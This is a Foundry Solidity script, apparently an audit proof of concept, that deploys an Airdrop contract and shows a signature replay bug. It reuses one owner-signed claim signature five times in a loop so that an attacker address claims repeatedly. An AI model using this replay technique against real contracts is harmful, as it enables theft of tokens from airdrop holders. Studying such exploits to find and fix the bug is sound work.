// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Script.sol";
import "../src/guildAuditAirDrop.sol";

contract Exploit is Script {
    function run() external {
        uint256 deployerPrivateKey = vm.envUint("DEPLOYER_PRIVATE_KEY");
        uint256 attackerPrivateKey = vm.envUint("ATTACKER_PRIVATE_KEY");

        vm.startBroadcast(deployerPrivateKey);

        Airdrop airdrop = new Airdrop();
        console.log("Airdrop contract deployed at:", address(airdrop));

        address owner = vm.addr(deployerPrivateKey);
        address attacker = vm.addr(attackerPrivateKey);

        uint256 amount = 10 ether;

        // Create a valid signature from the owner
        bytes32 message = airdrop.prefixed(keccak256(abi.encodePacked(attacker, amount)));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(deployerPrivateKey, message);

        vm.stopBroadcast();

        // Exploit the replay bug
        vm.startBroadcast(attackerPrivateKey);

        for (uint256 i = 0; i < 5; i++) {
            airdrop.claim(amount, v, r, s);
            console.log("Airdrop claimed", i + 1, "times");
        }

        console.log("Attacker's claimed amount:", airdrop.claimed(attacker));
    }
}
